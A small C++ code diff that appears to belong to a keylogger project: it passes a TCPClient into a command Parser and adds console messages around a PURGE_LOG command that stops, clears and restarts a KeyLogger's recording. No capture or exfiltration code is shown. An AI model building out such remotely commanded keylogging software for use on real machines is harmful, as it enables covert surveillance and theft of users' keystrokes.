@@ -1,6 +1,8 @@
+#include "TCPClient.hpp"
 #include "Parser.hpp"
 
-Parser::Parser()
+Parser::Parser(TCPClient &client) :
+	m_client(client)
 {
 }
 
@@ -24,7 +26,9 @@ void Parser::parseCommands()
 			if (command->cmd == commandType::PURGE_LOG)
 			{
 				KeyLogger::getInstance().stopRecording();
+				std::cout << "Log Purge...";
 				KeyLogger::getInstance().purgeLog();
+				std::cout << " Done" << std::endl;
 				KeyLogger::getInstance().startRecording();
 			}
 		}
